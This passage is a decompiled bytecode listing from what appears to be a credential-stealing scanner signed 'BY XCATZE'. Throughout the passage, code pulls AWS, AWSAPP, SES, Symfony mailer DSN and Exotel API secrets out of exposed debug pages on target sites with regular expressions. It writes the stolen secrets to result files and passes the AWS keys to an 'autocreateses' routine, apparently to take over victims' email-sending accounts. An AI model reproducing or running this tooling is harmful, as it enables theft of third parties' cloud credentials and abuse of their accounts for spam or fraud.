             3290  STORE_FAST               'aws_reg'

 L.1654      3292  LOAD_STR                 'URL: '
             3294  LOAD_GLOBAL              str
             3296  LOAD_FAST                'url'
             3298  CALL_FUNCTION_1       1  ''
             3300  BINARY_ADD       
             3302  LOAD_STR                 '\nAWS_KEY: '
             3304  BINARY_ADD       
             3306  LOAD_GLOBAL              str
             3308  LOAD_FAST                'aws_kid'
             3310  CALL_FUNCTION_1       1  ''
             3312  BINARY_ADD       
             3314  LOAD_STR                 '\nAWS_SECRET: '
             3316  BINARY_ADD       
             3318  LOAD_GLOBAL              str
             3320  LOAD_FAST                'aws_sky'
             3322  CALL_FUNCTION_1       1  ''
             3324  BINARY_ADD       
             3326  LOAD_STR                 '\nAWS_REGION: '
             3328  BINARY_ADD       
             3330  LOAD_GLOBAL              str
             3332  LOAD_FAST                'aws_reg'
             3334  CALL_FUNCTION_1       1  ''
             3336  BINARY_ADD       
             3338  STORE_FAST               'build'

 L.1655      3340  LOAD_GLOBAL              str
             3342  LOAD_FAST                'build'
             3344  CALL_FUNCTION_1       1  ''
             3346  LOAD_METHOD              replace
             3348  LOAD_STR                 '\r'
             3350  LOAD_STR                 ''
             3352  CALL_METHOD_2         2  ''
             3354  STORE_FAST               'remover'

 L.1656      3356  LOAD_GLOBAL              str
             3358  LOAD_FAST                'aws_kid'
             3360  CALL_FUNCTION_1       1  ''
             3362  LOAD_STR                 '|'
             3364  BINARY_ADD       
             3366  LOAD_GLOBAL              str
             3368  LOAD_FAST                'aws_sky'
             3370  CALL_FUNCTION_1       1  ''
             3372  BINARY_ADD       
             3374  LOAD_STR                 '|'
             3376  BINARY_ADD       
             3378  LOAD_GLOBAL              str
             3380  LOAD_FAST                'aws_reg'
             3382  CALL_FUNCTION_1       1  ''
             3384  BINARY_ADD       
             3386  STORE_FAST               'build2'

 L.1657      3388  LOAD_GLOBAL              str
             3390  LOAD_FAST                'mailuser'
             3392  CALL_FUNCTION_1       1  ''
             3394  LOAD_STR                 ''
             3396  COMPARE_OP               !=
         3398_3400  POP_JUMP_IF_FALSE  4508  'to 4508'
             3402  LOAD_GLOBAL              str
             3404  LOAD_FAST                'mailport'
             3406  CALL_FUNCTION_1       1  ''
             3408  LOAD_STR                 ''
             3410  COMPARE_OP               !=
         3412_3414  POP_JUMP_IF_FALSE  4508  'to 4508'

 L.1658      3416  LOAD_GLOBAL              open
             3418  LOAD_STR                 'result/'
             3420  LOAD_FAST                'aws_reg'
             3422  BINARY_ADD       
             3424  LOAD_STR                 '.txt'
             3426  BINARY_ADD       
             3428  LOAD_STR                 'a'
             3430  CALL_FUNCTION_2       2  ''
             3432  STORE_FAST               'save'

 L.1659      3434  LOAD_FAST                'save'
             3436  LOAD_METHOD              write
             3438  LOAD_FAST                'remover'
             3440  LOAD_STR                 '\n\n'
             3442  BINARY_ADD       
             3444  CALL_METHOD_1         1  ''
             3446  POP_TOP          

 L.1660      3448  LOAD_FAST                'save'
             3450  LOAD_METHOD              close
             3452  CALL_METHOD_0         0  ''
             3454  POP_TOP          

 L.1661      3456  LOAD_GLOBAL              open
             3458  LOAD_STR                 'result/aws_secret_key.txt'
             3460  LOAD_STR                 'a'
             3462  CALL_FUNCTION_2       2  ''
             3464  STORE_FAST               'save2'

 L.1662      3466  LOAD_FAST                'save2'
             3468  LOAD_METHOD              write
             3470  LOAD_FAST                'remover'
             3472  LOAD_STR                 '\n\n'
             3474  BINARY_ADD       
             3476  CALL_METHOD_1         1  ''
             3478  POP_TOP          

 L.1663      3480  LOAD_FAST                'save2'
             3482  LOAD_METHOD              close
             3484  CALL_METHOD_0         0  ''
             3486  POP_TOP          

 L.1664      3488  LOAD_GLOBAL              open
             3490  LOAD_STR                 'result/aws_secret_key_for_checker.txt'
             3492  LOAD_STR                 'a'
             3494  CALL_FUNCTION_2       2  ''
             3496  STORE_FAST               'save3'

 L.1665      3498  LOAD_FAST                'save3'
             3500  LOAD_METHOD              write
             3502  LOAD_FAST                'build2'
             3504  LOAD_STR                 '\n'
             3506  BINARY_ADD       
             3508  CALL_METHOD_1         1  ''
             3510  POP_TOP          

 L.1666      3512  LOAD_FAST                'save3'
             3514  LOAD_METHOD              close
             3516  CALL_METHOD_0         0  ''
             3518  POP_TOP          

 L.1667      3520  SETUP_FINALLY      3540  'to 3540'

 L.1668      3522  LOAD_GLOBAL              autocreateses
             3524  LOAD_FAST                'url'
             3526  LOAD_FAST                'aws_kid'
             3528  LOAD_FAST                'aws_sky'
             3530  LOAD_FAST                'aws_reg'
             3532  CALL_FUNCTION_4       4  ''
             3534  POP_TOP          
             3536  POP_BLOCK        
             3538  JUMP_FORWARD       4508  'to 4508'
           3540_0  COME_FROM_FINALLY  3520  '3520'

 L.1669      3540  POP_TOP          
             3542  POP_TOP          
             3544  POP_TOP          

 L.1670      3546  LOAD_GLOBAL              print
             3548  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             3550  LOAD_METHOD              format
             3552  LOAD_GLOBAL              str
             3554  LOAD_FAST                'url'
             3556  CALL_FUNCTION_1       1  ''
             3558  CALL_METHOD_1         1  ''
             3560  CALL_FUNCTION_1       1  ''
             3562  POP_TOP          
             3564  POP_EXCEPT       
             3566  JUMP_FORWARD       4508  'to 4508'
             3568  END_FINALLY      
         3570_3572  JUMP_FORWARD       4508  'to 4508'
           3574_0  COME_FROM          3246  '3246'

 L.1671      3574  LOAD_STR                 '<td>AWS_KEY</td>'
             3576  LOAD_FAST                'text'
             3578  COMPARE_OP               in
         3580_3582  POP_JUMP_IF_FALSE  3908  'to 3908'

 L.1672      3584  LOAD_GLOBAL              reg
             3586  LOAD_STR                 '<td>AWS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3588  LOAD_FAST                'text'
             3590  CALL_FUNCTION_2       2  ''
             3592  LOAD_CONST               0
             3594  BINARY_SUBSCR    
             3596  STORE_FAST               'aws_kid'

 L.1673      3598  LOAD_GLOBAL              reg
             3600  LOAD_STR                 '<td>AWS_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3602  LOAD_FAST                'text'
             3604  CALL_FUNCTION_2       2  ''
             3606  LOAD_CONST               0
             3608  BINARY_SUBSCR    
             3610  STORE_FAST               'aws_sky'

 L.1674      3612  LOAD_GLOBAL              reg
             3614  LOAD_STR                 '<td>AWS_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3616  LOAD_FAST                'text'
             3618  CALL_FUNCTION_2       2  ''
             3620  LOAD_CONST               0
             3622  BINARY_SUBSCR    
             3624  STORE_FAST               'aws_reg'

 L.1675      3626  LOAD_STR                 'URL: '
             3628  LOAD_GLOBAL              str
             3630  LOAD_FAST                'url'
             3632  CALL_FUNCTION_1       1  ''
             3634  BINARY_ADD       
             3636  LOAD_STR                 '\nAWS_KEY: '
             3638  BINARY_ADD       
             3640  LOAD_GLOBAL              str
             3642  LOAD_FAST                'aws_kid'
             3644  CALL_FUNCTION_1       1  ''
             3646  BINARY_ADD       
             3648  LOAD_STR                 '\nAWS_SECRET: '
             3650  BINARY_ADD       
             3652  LOAD_GLOBAL              str
             3654  LOAD_FAST                'aws_sky'
             3656  CALL_FUNCTION_1       1  ''
             3658  BINARY_ADD       
             3660  LOAD_STR                 '\nAWS_REGION: '
             3662  BINARY_ADD       
             3664  LOAD_GLOBAL              str
             3666  LOAD_FAST                'aws_reg'
             3668  CALL_FUNCTION_1       1  ''
             3670  BINARY_ADD       
             3672  STORE_FAST               'build'

 L.1676      3674  LOAD_GLOBAL              str
             3676  LOAD_FAST                'build'
             3678  CALL_FUNCTION_1       1  ''
             3680  LOAD_METHOD              replace
             3682  LOAD_STR                 '\r'
             3684  LOAD_STR                 ''
             3686  CALL_METHOD_2         2  ''
             3688  STORE_FAST               'remover'

 L.1677      3690  LOAD_GLOBAL              str
             3692  LOAD_FAST                'aws_kid'
             3694  CALL_FUNCTION_1       1  ''
             3696  LOAD_STR                 '|'
             3698  BINARY_ADD       
             3700  LOAD_GLOBAL              str
             3702  LOAD_FAST                'aws_sky'
             3704  CALL_FUNCTION_1       1  ''
             3706  BINARY_ADD       
             3708  LOAD_STR                 '|'
             3710  BINARY_ADD       
             3712  LOAD_GLOBAL              str
             3714  LOAD_FAST                'aws_reg'
             3716  CALL_FUNCTION_1       1  ''
             3718  BINARY_ADD       
             3720  STORE_FAST               'build2'

 L.1678      3722  LOAD_GLOBAL              str
             3724  LOAD_FAST                'mailuser'
             3726  CALL_FUNCTION_1       1  ''
             3728  LOAD_STR                 ''
             3730  COMPARE_OP               !=
         3732_3734  POP_JUMP_IF_FALSE  4508  'to 4508'
             3736  LOAD_GLOBAL              str
             3738  LOAD_FAST                'mailport'
             3740  CALL_FUNCTION_1       1  ''
             3742  LOAD_STR                 ''
             3744  COMPARE_OP               !=
         3746_3748  POP_JUMP_IF_FALSE  4508  'to 4508'

 L.1679      3750  LOAD_GLOBAL              open
             3752  LOAD_STR                 'result/'
             3754  LOAD_FAST                'aws_reg'
             3756  BINARY_ADD       
             3758  LOAD_STR                 '.txt'
             3760  BINARY_ADD       
             3762  LOAD_STR                 'a'
             3764  CALL_FUNCTION_2       2  ''
             3766  STORE_FAST               'save'

 L.1680      3768  LOAD_FAST                'save'
             3770  LOAD_METHOD              write
             3772  LOAD_FAST                'remover'
             3774  LOAD_STR                 '\n\n'
             3776  BINARY_ADD       
             3778  CALL_METHOD_1         1  ''
             3780  POP_TOP          

 L.1681      3782  LOAD_FAST                'save'
             3784  LOAD_METHOD              close
             3786  CALL_METHOD_0         0  ''
             3788  POP_TOP          

 L.1682      3790  LOAD_GLOBAL              open
             3792  LOAD_STR                 'result/aws_secret_key.txt'
             3794  LOAD_STR                 'a'
             3796  CALL_FUNCTION_2       2  ''
             3798  STORE_FAST               'save2'

 L.1683      3800  LOAD_FAST                'save2'
             3802  LOAD_METHOD              write
             3804  LOAD_FAST                'remover'
             3806  LOAD_STR                 '\n\n'
             3808  BINARY_ADD       
             3810  CALL_METHOD_1         1  ''
             3812  POP_TOP          

 L.1684      3814  LOAD_FAST                'save2'
             3816  LOAD_METHOD              close
             3818  CALL_METHOD_0         0  ''
             3820  POP_TOP          

 L.1685      3822  LOAD_GLOBAL              open
             3824  LOAD_STR                 'result/aws_secret_key_for_checker.txt'
             3826  LOAD_STR                 'a'
             3828  CALL_FUNCTION_2       2  ''
             3830  STORE_FAST               'save3'

 L.1686      3832  LOAD_FAST                'save3'
             3834  LOAD_METHOD              write
             3836  LOAD_FAST                'build2'
             3838  LOAD_STR                 '\n'
             3840  BINARY_ADD       
             3842  CALL_METHOD_1         1  ''
             3844  POP_TOP          

 L.1687      3846  LOAD_FAST                'save3'
             3848  LOAD_METHOD              close
             3850  CALL_METHOD_0         0  ''
             3852  POP_TOP          

 L.1688      3854  SETUP_FINALLY      3874  'to 3874'

 L.1689      3856  LOAD_GLOBAL              autocreateses
             3858  LOAD_FAST                'url'
             3860  LOAD_FAST                'aws_kid'
             3862  LOAD_FAST                'aws_sky'
             3864  LOAD_FAST                'aws_reg'
             3866  CALL_FUNCTION_4       4  ''
             3868  POP_TOP          
             3870  POP_BLOCK        
             3872  JUMP_FORWARD       4508  'to 4508'
           3874_0  COME_FROM_FINALLY  3854  '3854'

 L.1690      3874  POP_TOP          
             3876  POP_TOP          
             3878  POP_TOP          

 L.1691      3880  LOAD_GLOBAL              print
             3882  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             3884  LOAD_METHOD              format
             3886  LOAD_GLOBAL              str
             3888  LOAD_FAST                'url'
             3890  CALL_FUNCTION_1       1  ''
             3892  CALL_METHOD_1         1  ''
             3894  CALL_FUNCTION_1       1  ''
             3896  POP_TOP          
             3898  POP_EXCEPT       
             3900  JUMP_FORWARD       4508  'to 4508'
             3902  END_FINALLY      
         3904_3906  JUMP_FORWARD       4508  'to 4508'
           3908_0  COME_FROM          3580  '3580'

 L.1692      3908  LOAD_STR                 '<td>AWSAPP_KEY</td>'
             3910  LOAD_FAST                'text'
             3912  COMPARE_OP               in
         3914_3916  POP_JUMP_IF_FALSE  4242  'to 4242'

 L.1693      3918  LOAD_GLOBAL              reg
             3920  LOAD_STR                 '<td>AWSAPP_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3922  LOAD_FAST                'text'
             3924  CALL_FUNCTION_2       2  ''
             3926  LOAD_CONST               0
             3928  BINARY_SUBSCR    
             3930  STORE_FAST               'aws_kid'

 L.1694      3932  LOAD_GLOBAL              reg
             3934  LOAD_STR                 '<td>AWSAPP_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3936  LOAD_FAST                'text'
             3938  CALL_FUNCTION_2       2  ''
             3940  LOAD_CONST               0
             3942  BINARY_SUBSCR    
             3944  STORE_FAST               'aws_sky'

 L.1695      3946  LOAD_GLOBAL              reg
             3948  LOAD_STR                 '<td>AWSAPP_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3950  LOAD_FAST                'text'
             3952  CALL_FUNCTION_2       2  ''
             3954  LOAD_CONST               0
             3956  BINARY_SUBSCR    
             3958  STORE_FAST               'aws_reg'

 L.1696      3960  LOAD_STR                 'URL: '
             3962  LOAD_GLOBAL              str
             3964  LOAD_FAST                'url'
             3966  CALL_FUNCTION_1       1  ''
             3968  BINARY_ADD       
             3970  LOAD_STR                 '\nAWSAPP_KEY: '
             3972  BINARY_ADD       
             3974  LOAD_GLOBAL              str
             3976  LOAD_FAST                'aws_kid'
             3978  CALL_FUNCTION_1       1  ''
             3980  BINARY_ADD       
             3982  LOAD_STR                 '\nAWSAPP_SECRET: '
             3984  BINARY_ADD       
             3986  LOAD_GLOBAL              str
             3988  LOAD_FAST                'aws_sky'
             3990  CALL_FUNCTION_1       1  ''
             3992  BINARY_ADD       
             3994  LOAD_STR                 '\nAWSAPP_REGION: '
             3996  BINARY_ADD       
             3998  LOAD_GLOBAL              str
             4000  LOAD_FAST                'aws_reg'
             4002  CALL_FUNCTION_1       1  ''
             4004  BINARY_ADD       
             4006  STORE_FAST               'build'

 L.1697      4008  LOAD_GLOBAL              str
             4010  LOAD_FAST                'build'
             4012  CALL_FUNCTION_1       1  ''
             4014  LOAD_METHOD              replace
             4016  LOAD_STR                 '\r'
             4018  LOAD_STR                 ''
             4020  CALL_METHOD_2         2  ''
             4022  STORE_FAST               'remover'

 L.1698      4024  LOAD_GLOBAL              str
             4026  LOAD_FAST                'aws_kid'
             4028  CALL_FUNCTION_1       1  ''
             4030  LOAD_STR                 '|'
             4032  BINARY_ADD       
             4034  LOAD_GLOBAL              str
             4036  LOAD_FAST                'aws_sky'
             4038  CALL_FUNCTION_1       1  ''
             4040  BINARY_ADD       
             4042  LOAD_STR                 '|'
             4044  BINARY_ADD       
             4046  LOAD_GLOBAL              str
             4048  LOAD_FAST                'aws_reg'
             4050  CALL_FUNCTION_1       1  ''
             4052  BINARY_ADD       
             4054  STORE_FAST               'build2'

 L.1699      4056  LOAD_GLOBAL              str
             4058  LOAD_FAST                'mailuser'
             4060  CALL_FUNCTION_1       1  ''
             4062  LOAD_STR                 ''
             4064  COMPARE_OP               !=
         4066_4068  POP_JUMP_IF_FALSE  4508  'to 4508'
             4070  LOAD_GLOBAL              str
             4072  LOAD_FAST                'mailport'
             4074  CALL_FUNCTION_1       1  ''
             4076  LOAD_STR                 ''
             4078  COMPARE_OP               !=
         4080_4082  POP_JUMP_IF_FALSE  4508  'to 4508'

 L.1700      4084  LOAD_GLOBAL              open
             4086  LOAD_STR                 'result/'
             4088  LOAD_FAST                'aws_reg'
             4090  BINARY_ADD       
             4092  LOAD_STR                 '.txt'
             4094  BINARY_ADD       
             4096  LOAD_STR                 'a'
             4098  CALL_FUNCTION_2       2  ''
             4100  STORE_FAST               'save'

 L.1701      4102  LOAD_FAST                'save'
             4104  LOAD_METHOD              write
             4106  LOAD_FAST                'remover'
             4108  LOAD_STR                 '\n\n'
             4110  BINARY_ADD       
             4112  CALL_METHOD_1         1  ''
             4114  POP_TOP          

 L.1702      4116  LOAD_FAST                'save'
             4118  LOAD_METHOD              close
             4120  CALL_METHOD_0         0  ''
             4122  POP_TOP          

 L.1703      4124  LOAD_GLOBAL              open
             4126  LOAD_STR                 'result/aws_secret_key.txt'
             4128  LOAD_STR                 'a'
             4130  CALL_FUNCTION_2       2  ''
             4132  STORE_FAST               'save2'

 L.1704      4134  LOAD_FAST                'save2'
             4136  LOAD_METHOD              write
             4138  LOAD_FAST                'remover'
             4140  LOAD_STR                 '\n\n'
             4142  BINARY_ADD       
             4144  CALL_METHOD_1         1  ''
             4146  POP_TOP          

 L.1705      4148  LOAD_FAST                'save2'
             4150  LOAD_METHOD              close
             4152  CALL_METHOD_0         0  ''
             4154  POP_TOP          

 L.1706      4156  LOAD_GLOBAL              open
             4158  LOAD_STR                 'result/aws_secret_key_for_checker.txt'
             4160  LOAD_STR                 'a'
             4162  CALL_FUNCTION_2       2  ''
             4164  STORE_FAST               'save3'

 L.1707      4166  LOAD_FAST                'save3'
             4168  LOAD_METHOD              write
             4170  LOAD_FAST                'build2'
             4172  LOAD_STR                 '\n'
             4174  BINARY_ADD       
             4176  CALL_METHOD_1         1  ''
             4178  POP_TOP          

 L.1708      4180  LOAD_FAST                'save3'
             4182  LOAD_METHOD              close
             4184  CALL_METHOD_0         0  ''
             4186  POP_TOP          

 L.1709      4188  SETUP_FINALLY      4208  'to 4208'

 L.1710      4190  LOAD_GLOBAL              autocreateses
             4192  LOAD_FAST                'url'
             4194  LOAD_FAST                'aws_kid'
             4196  LOAD_FAST                'aws_sky'
             4198  LOAD_FAST                'aws_reg'
             4200  CALL_FUNCTION_4       4  ''
             4202  POP_TOP          
             4204  POP_BLOCK        
             4206  JUMP_FORWARD       4508  'to 4508'
           4208_0  COME_FROM_FINALLY  4188  '4188'

 L.1711      4208  POP_TOP          
             4210  POP_TOP          
             4212  POP_TOP          

 L.1712      4214  LOAD_GLOBAL              print
             4216  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             4218  LOAD_METHOD              format
             4220  LOAD_GLOBAL              str
             4222  LOAD_FAST                'url'
             4224  CALL_FUNCTION_1       1  ''
             4226  CALL_METHOD_1         1  ''
             4228  CALL_FUNCTION_1       1  ''
             4230  POP_TOP          
             4232  POP_EXCEPT       
             4234  JUMP_FORWARD       4508  'to 4508'
             4236  END_FINALLY      
         4238_4240  JUMP_FORWARD       4508  'to 4508'
           4242_0  COME_FROM          3914  '3914'

 L.1713      4242  LOAD_STR                 '<td>SES_KEY</td>'
             4244  LOAD_FAST                'text'
             4246  COMPARE_OP               in
         4248_4250  POP_JUMP_IF_FALSE  4508  'to 4508'

 L.1714      4252  LOAD_GLOBAL              reg
             4254  LOAD_STR                 '<td>SES_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4256  LOAD_FAST                'text'
             4258  CALL_FUNCTION_2       2  ''
             4260  LOAD_CONST               0
             4262  BINARY_SUBSCR    
             4264  STORE_FAST               'aws_kid'

 L.1715      4266  LOAD_GLOBAL              reg
             4268  LOAD_STR                 '<td>SES_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4270  LOAD_FAST                'text'
             4272  CALL_FUNCTION_2       2  ''
             4274  LOAD_CONST               0
             4276  BINARY_SUBSCR    
             4278  STORE_FAST               'aws_sky'

 L.1716      4280  LOAD_GLOBAL              reg
             4282  LOAD_STR                 '<td>SES_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4284  LOAD_FAST                'text'
             4286  CALL_FUNCTION_2       2  ''
             4288  LOAD_CONST               0
             4290  BINARY_SUBSCR    
             4292  STORE_FAST               'aws_reg'

 L.1717      4294  LOAD_STR                 'URL: '
             4296  LOAD_GLOBAL              str
             4298  LOAD_FAST                'url'
             4300  CALL_FUNCTION_1       1  ''
             4302  BINARY_ADD       
             4304  LOAD_STR                 '\nSES_KEY: '
             4306  BINARY_ADD       
             4308  LOAD_GLOBAL              str
             4310  LOAD_FAST                'aws_kid'
             4312  CALL_FUNCTION_1       1  ''
             4314  BINARY_ADD       
             4316  LOAD_STR                 '\nSES_SECRET: '
             4318  BINARY_ADD       
             4320  LOAD_GLOBAL              str
             4322  LOAD_FAST                'aws_sky'
             4324  CALL_FUNCTION_1       1  ''
             4326  BINARY_ADD       
             4328  LOAD_STR                 '\nSES_REGION: '
             4330  BINARY_ADD       
             4332  LOAD_GLOBAL              str
             4334  LOAD_FAST                'aws_reg'
             4336  CALL_FUNCTION_1       1  ''
             4338  BINARY_ADD       
             4340  STORE_FAST               'build'

 L.1718      4342  LOAD_GLOBAL              str
             4344  LOAD_FAST                'build'
             4346  CALL_FUNCTION_1       1  ''
             4348  LOAD_METHOD              replace
             4350  LOAD_STR                 '\r'
             4352  LOAD_STR                 ''
             4354  CALL_METHOD_2         2  ''
             4356  STORE_FAST               'remover'

 L.1719      4358  LOAD_GLOBAL              str
             4360  LOAD_FAST                'mailuser'
             4362  CALL_FUNCTION_1       1  ''
             4364  LOAD_STR                 ''
             4366  COMPARE_OP               !=
         4368_4370  POP_JUMP_IF_FALSE  4508  'to 4508'
             4372  LOAD_GLOBAL              str
             4374  LOAD_FAST                'mailport'
             4376  CALL_FUNCTION_1       1  ''
             4378  LOAD_STR                 ''
             4380  COMPARE_OP               !=
         4382_4384  POP_JUMP_IF_FALSE  4508  'to 4508'

 L.1720      4386  LOAD_GLOBAL              open
             4388  LOAD_STR                 'result/'
             4390  LOAD_FAST                'aws_reg'
             4392  BINARY_ADD       
             4394  LOAD_STR                 '.txt'
             4396  BINARY_ADD       
             4398  LOAD_STR                 'a'
             4400  CALL_FUNCTION_2       2  ''
             4402  STORE_FAST               'save'

 L.1721      4404  LOAD_FAST                'save'
             4406  LOAD_METHOD              write
             4408  LOAD_FAST                'remover'
             4410  LOAD_STR                 '\n\n'
             4412  BINARY_ADD       
             4414  CALL_METHOD_1         1  ''
             4416  POP_TOP          

 L.1722      4418  LOAD_FAST                'save'
             4420  LOAD_METHOD              close
             4422  CALL_METHOD_0         0  ''
             4424  POP_TOP          

 L.1723      4426  LOAD_GLOBAL              open
             4428  LOAD_STR                 'result/ses_key.txt'
             4430  LOAD_STR                 'a'
             4432  CALL_FUNCTION_2       2  ''
             4434  STORE_FAST               'save2'

 L.1724      4436  LOAD_FAST                'save2'
             4438  LOAD_METHOD              write
             4440  LOAD_FAST                'remover'
             4442  LOAD_STR                 '\n\n'
             4444  BINARY_ADD       
             4446  CALL_METHOD_1         1  ''
             4448  POP_TOP          

 L.1725      4450  LOAD_FAST                'save2'
             4452  LOAD_METHOD              close
             4454  CALL_METHOD_0         0  ''
             4456  POP_TOP          

 L.1726      4458  SETUP_FINALLY      4478  'to 4478'

 L.1727      4460  LOAD_GLOBAL              autocreateses
             4462  LOAD_FAST                'url'
             4464  LOAD_FAST                'aws_kid'
             4466  LOAD_FAST                'aws_sky'
             4468  LOAD_FAST                'aws_reg'
             4470  CALL_FUNCTION_4       4  ''
             4472  POP_TOP          
           4474_0  COME_FROM          4206  '4206'
           4474_1  COME_FROM          3872  '3872'
           4474_2  COME_FROM          3538  '3538'
             4474  POP_BLOCK        
             4476  JUMP_FORWARD       4508  'to 4508'
           4478_0  COME_FROM_FINALLY  4458  '4458'

 L.1728      4478  POP_TOP          
             4480  POP_TOP          
             4482  POP_TOP          

 L.1729      4484  LOAD_GLOBAL              print
             4486  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             4488  LOAD_METHOD              format
             4490  LOAD_GLOBAL              str
             4492  LOAD_FAST                'url'
             4494  CALL_FUNCTION_1       1  ''
             4496  CALL_METHOD_1         1  ''
             4498  CALL_FUNCTION_1       1  ''
             4500  POP_TOP          
           4502_0  COME_FROM          4234  '4234'
           4502_1  COME_FROM          3900  '3900'
           4502_2  COME_FROM          3566  '3566'
             4502  POP_EXCEPT       
             4504  JUMP_FORWARD       4508  'to 4508'
             4506  END_FINALLY      
           4508_0  COME_FROM          4504  '4504'
           4508_1  COME_FROM          4476  '4476'
           4508_2  COME_FROM          4382  '4382'
           4508_3  COME_FROM          4368  '4368'
           4508_4  COME_FROM          4248  '4248'
           4508_5  COME_FROM          4238  '4238'
           4508_6  COME_FROM          4080  '4080'
           4508_7  COME_FROM          4066  '4066'
           4508_8  COME_FROM          3904  '3904'
           4508_9  COME_FROM          3746  '3746'
          4508_10  COME_FROM          3732  '3732'
          4508_11  COME_FROM          3570  '3570'
          4508_12  COME_FROM          3412  '3412'
          4508_13  COME_FROM          3398  '3398'

 L.1731      4508  LOAD_STR                 '<td>MAILER_DSN</td>'
             4510  LOAD_FAST                'text'
             4512  COMPARE_OP               in
         4514_4516  POP_JUMP_IF_FALSE  4632  'to 4632'

 L.1732      4518  LOAD_GLOBAL              reg
             4520  LOAD_STR                 '<td>MAILER_DSN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4522  LOAD_FAST                'text'
             4524  CALL_FUNCTION_2       2  ''
             4526  LOAD_CONST               0
             4528  BINARY_SUBSCR    
             4530  STORE_FAST               'aws_kid'

 L.1733      4532  LOAD_STR                 'URL: '
             4534  LOAD_GLOBAL              str
             4536  LOAD_FAST                'url'
             4538  CALL_FUNCTION_1       1  ''
             4540  BINARY_ADD       
             4542  LOAD_STR                 '\nMAILER_DSN: '
             4544  BINARY_ADD       
             4546  LOAD_GLOBAL              str
             4548  LOAD_FAST                'aws_kid'
             4550  CALL_FUNCTION_1       1  ''
             4552  BINARY_ADD       
             4554  STORE_FAST               'build'

 L.1734      4556  LOAD_GLOBAL              str
             4558  LOAD_FAST                'build'
             4560  CALL_FUNCTION_1       1  ''
             4562  LOAD_METHOD              replace
             4564  LOAD_STR                 '\r'
             4566  LOAD_STR                 ''
             4568  CALL_METHOD_2         2  ''
             4570  STORE_FAST               'remover'

 L.1735      4572  LOAD_GLOBAL              str
             4574  LOAD_FAST                'aws_kid'
             4576  CALL_FUNCTION_1       1  ''
             4578  LOAD_STR                 ''
             4580  COMPARE_OP               !=
         4582_4584  POP_JUMP_IF_FALSE  4632  'to 4632'
             4586  LOAD_GLOBAL              str
             4588  LOAD_FAST                'aws_kid'
             4590  CALL_FUNCTION_1       1  ''
             4592  LOAD_STR                 'smtp://localhost'
             4594  COMPARE_OP               !=
         4596_4598  POP_JUMP_IF_FALSE  4632  'to 4632'

 L.1736      4600  LOAD_GLOBAL              open
             4602  LOAD_STR                 'result/symfony_mailer_dsn.txt'
             4604  LOAD_STR                 'a'
             4606  CALL_FUNCTION_2       2  ''
             4608  STORE_FAST               'save'

 L.1737      4610  LOAD_FAST                'save'
             4612  LOAD_METHOD              write
             4614  LOAD_FAST                'remover'
             4616  LOAD_STR                 '\n\n'
             4618  BINARY_ADD       
             4620  CALL_METHOD_1         1  ''
             4622  POP_TOP          

 L.1738      4624  LOAD_FAST                'save'
             4626  LOAD_METHOD              close
             4628  CALL_METHOD_0         0  ''
             4630  POP_TOP          
           4632_0  COME_FROM          4596  '4596'
           4632_1  COME_FROM          4582  '4582'
           4632_2  COME_FROM          4514  '4514'

 L.1740      4632  LOAD_STR                 '<td>EXOTEL_API_KEY</td>'
             4634  LOAD_FAST                'text'
             4636  COMPARE_OP               in
         4638_4640  POP_JUMP_IF_FALSE  4876  'to 4876'
             4642  LOAD_GLOBAL              EXOTEL
             4644  CALL_FUNCTION_0       0  ''
             4646  LOAD_STR                 'on'
             4648  COMPARE_OP               ==
         4650_4652  POP_JUMP_IF_FALSE  4876  'to 4876'

 L.1741      4654  SETUP_FINALLY      4674  'to 4674'

 L.1742      4656  LOAD_GLOBAL              reg
             4658  LOAD_STR                 '<td>EXOTEL_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4660  LOAD_FAST                'text'
             4662  CALL_FUNCTION_2       2  ''
             4664  LOAD_CONST               0
             4666  BINARY_SUBSCR    
             4668  STORE_FAST               'exotel_api'
             4670  POP_BLOCK        
             4672  JUMP_FORWARD       4690  'to 4690'
           4674_0  COME_FROM_FINALLY  4654  '4654'

 L.1743      4674  POP_TOP          
             4676  POP_TOP          
             4678  POP_TOP          

 L.1744      4680  LOAD_STR                 ''
             4682  STORE_FAST               'exotel_api'
             4684  POP_EXCEPT       
             4686  JUMP_FORWARD       4690  'to 4690'
             4688  END_FINALLY      
           4690_0  COME_FROM          4686  '4686'
           4690_1  COME_FROM          4672  '4672'

 L.1745      4690  SETUP_FINALLY      4710  'to 4710'

 L.1746      4692  LOAD_GLOBAL              reg
             4694  LOAD_STR                 '<td>EXOTEL_API_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4696  LOAD_FAST                'text'
             4698  CALL_FUNCTION_2       2  ''
             4700  LOAD_CONST               0
             4702  BINARY_SUBSCR    
             4704  STORE_FAST               'exotel_token'
             4706  POP_BLOCK        
             4708  JUMP_FORWARD       4726  'to 4726'
           4710_0  COME_FROM_FINALLY  4690  '4690'

 L.1747      4710  POP_TOP          
             4712  POP_TOP          
             4714  POP_TOP          

 L.1748      4716  LOAD_STR                 ''
             4718  STORE_FAST               'exotel_token'
             4720  POP_EXCEPT       
             4722  JUMP_FORWARD       4726  'to 4726'
             4724  END_FINALLY      
           4726_0  COME_FROM          4722  '4722'
           4726_1  COME_FROM          4708  '4708'

 L.1749      4726  SETUP_FINALLY      4746  'to 4746'

 L.1750      4728  LOAD_GLOBAL              reg
             4730  LOAD_STR                 '<td>EXOTEL_API_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4732  LOAD_FAST                'text'
